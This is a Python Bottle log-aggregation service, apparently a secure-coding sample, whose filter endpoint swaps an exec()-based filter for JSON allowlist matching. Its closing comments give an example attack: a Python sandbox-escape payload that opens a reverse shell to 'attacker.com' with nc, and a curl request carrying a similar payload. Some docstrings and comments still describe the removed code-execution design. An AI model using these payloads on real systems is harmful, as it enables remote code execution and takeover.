import os
import sys
import json
import sqlite3
import logging
from datetime import datetime
from bottle import Bottle, request, response, run

# Configure logging for the Distributed Log Aggregator
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - LogAggregator - %(levelname)s - %(message)s'
)
logger = logging.getLogger("BottleLogService")

DB_FILE = "aggregated_events.db"
app = Bottle()

def init_db():
    """Initializes the SQLite database for central log storage."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE events (
            event_id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            service_name TEXT NOT NULL,
            severity TEXT NOT NULL,
            message TEXT NOT NULL
        )
    ''')

    mock_logs = [
        ('auth-svc', 'INFO', 'User admin logged in successfully.'),
        ('payment-svc', 'ERROR', 'Connection to payment gateway timed out.'),
        ('inventory-svc', 'WARN', 'Stock level critical for SKU-992.'),
        ('auth-svc', 'DEBUG', 'Session token generated: 92837492'),
        ('frontend-app', 'INFO', 'Page load time optimized to 1.2s')
    ]
    cursor.executemany('''
        INSERT INTO events (service_name, severity, message)
        VALUES (?, ?, ?)
    ''', mock_logs)

    conn.commit()
    conn.close()
    logger.info("Log database initialized with mock data.")

def fetch_all_logs() -> list:
    """Retrieves all log events from the database."""
    logs = []
    try:
        conn = sqlite3.connect(DB_FILE)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM events ORDER BY timestamp DESC")
        for row in cursor.fetchall():
            logs.append(dict(row))
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Database error fetching logs: {e}")
    return logs

def execute_dynamic_filter(log_data: list, filter_query: str) -> list:
    """
    SECURE: Prevents Code Injection (CWE-94) by replacing arbitrary code 
    execution (exec) with safe, structured JSON-based filtering.
    """
    import json
    
    logger.info("Applying secure structured filter to log data...")
    
    try:
        # Secure: We remove the dangerous exec() function entirely. 
        # Executing untrusted strings as Python code is a critical vulnerability.
        # Instead, we redesign the filtering mechanism to accept a structured 
        # JSON string containing exact-match and substring criteria.
        # Note: The client must be updated to send a JSON filter string 
        # (e.g., '{"severity": "ERROR"}') rather than a raw Python script.
        
        criteria = json.loads(filter_query)
        
        if not isinstance(criteria, dict):
            logger.warning("Filter query must be a valid JSON object (dictionary).")
            return []
            
        filtered_results = []
        
        for log in log_data:
            match = True
            for key, expected_value in criteria.items():
                # Strictly allowlist which fields can be filtered to prevent 
                # unexpected behavior or data exposure
                if key not in ("service_name", "severity", "message"):
                    logger.warning(f"Ignored unauthorized or unknown filter key: {key}")
                    match = False
                    break
                
                # Perform substring matching for messages, exact match for others
                if key == "message":
                    if str(expected_value).lower() not in str(log.get(key, "")).lower():
                        match = False
                        break
                else:
                    if str(log.get(key)) != str(expected_value):
                        match = False
                        break
                        
            if match:
                filtered_results.append(log)
                
        logger.info(f"Structured filter applied safely. Retained {len(filtered_results)} logs.")
        return filtered_results
        
    except json.JSONDecodeError as e:
        logger.error(f"Failed to parse filter query as JSON: {e}")
        return []
    except Exception as e:
        logger.error(f"Unexpected error applying secure filter: {e}")
        return []

@app.route('/api/health', method='GET')
def health_check():
    """Standard health check endpoint."""
    response.content_type = 'application/json'
    return json.dumps({"status": "Bottle Log Aggregator is online"})

@app.route('/api/logs/query', method='POST')
def query_logs():
    """
    Endpoint to retrieve and dynamically filter logs.
    Expects JSON payload: {"script": "python code string here"}
    """
    response.content_type = 'application/json'
    
    if request.json is None:
        response.status = 400
        return json.dumps({"error": "Invalid or missing JSON payload."})
        
    filter_script = request.json.get("script")
    
    if not filter_script:
        response.status = 400
        return json.dumps({"error": "Missing 'script' parameter in JSON payload."})
        
    all_logs = fetch_all_logs()
    
    # Pass the untrusted string directly to the vulnerable function
    filtered_logs = execute_dynamic_filter(all_logs, filter_script)
    
    return json.dumps({
        "total_evaluated": len(all_logs),
        "total_returned": len(filtered_logs),
        "data": filtered_logs
    })

if __name__ == "__main__":
    init_db()
    
    # Example Malicious Trigger:
    # 1. Attacker sends a POST request with a script designed to break out 
    #    of the empty __builtins__ restriction and execute OS commands:
    #
    #    {
    #      "script": "[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('nc -e /bin/sh attacker.com 4444')"
    #    }
    #
    # 2. Attacker issues the request to the vulnerable endpoint:
    #    curl -X POST http://127.0.0.1:9090/api/logs/query \
    #         -H "Content-Type: application/json" \
    #         -d '{"script": "[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == '"'"'catch_warnings'"'"'][0]()._module.__builtins__['"'"'__import__'"'"']('"'"'os'"'"').system('"'"'echo RCE_SUCCESS'"'"')"}'
    
    logger.info("Starting Bottle Log Aggregator on http://0.0.0.0:9090")
    run(app, host='0.0.0.0', port=9090, quiet=True)
